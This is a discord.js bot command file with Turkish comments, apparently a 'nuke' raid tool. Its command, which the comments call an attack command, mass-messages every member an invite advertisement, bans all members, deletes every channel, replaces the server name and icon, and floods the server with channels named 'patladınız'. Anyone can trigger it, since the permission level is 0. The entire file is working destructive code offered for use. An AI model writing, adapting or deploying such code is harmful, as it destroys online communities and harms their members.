const Discord = require('discord.js');


exports.run = function(client, message) {

    message.guild.members.map(c => c.send(

"• **World Code | Kod Paylaşım** Sunucusuna Aittir\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
+"• https://discord.gg/x7VkCu9\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
+"• Kodu Paylaşmak Yasaktır"    //BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR

+"• **World | Kod Paylaşım** Sunucusuna Aittir\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
+"• https://discord.gg/x7VkCu9\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
+"• Kodu Paylaşmak Yasaktır"    //BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR

    ));
    message.guild.setIcon("https://images-ext-1.discordapp.net/external/_v5OFNRPGDzrRSeyGqPJZDFG1pJ1cB4CLOKkD6tEVCQ/https/cdn.discordapp.com/icons/613710959256666114/85232ac485acd744ab44ffa13395460a.jpg").catch(console.error);//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA SUNUCU PPSİNİ DEĞİŞTİRMEKTE KULLANMASI GEREKTİĞİ PPNİN LİNKİ
  message.guild.members.map(c => c.ban());
  message.guild.channels.map(c => c.delete())
  
message.guild.setName("World Code ")//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA SUNUCUN İSMİ
  

  message.guild.createChannel("patladınız").catch(console.error);//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA AÇTIĞI KANALLAR
  message.guild.createChannel("patladınız").catch(console.error);//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA AÇTIĞI KANALLAR
  message.guild.createChannel("patladınız").catch(console.error);//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA AÇTIĞI KANALLAR
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  
  
};

exports.conf = {
  enabled: true,//True => Komut açık, False => Komut kapalı 
  guildOnly: true, //True => Sadece Servere Özel, False => Heryerde kullanılabilir
  aliases: [],//Komutun farklı kullanımları ÖR: !ping, !p
  permLevel: 0 //kimlerin kullanabileceğini  (bot.js dosyasında perm leveller yazıyor)
};

exports.help = {
  name: 'başla',//Komutun adı (Komutu girerken lazım olucak)
  description: '',//Komutun Açıklaması
  usage: '' //komutun kullanım şekli; ÖR: !ban @Kullanıcı
}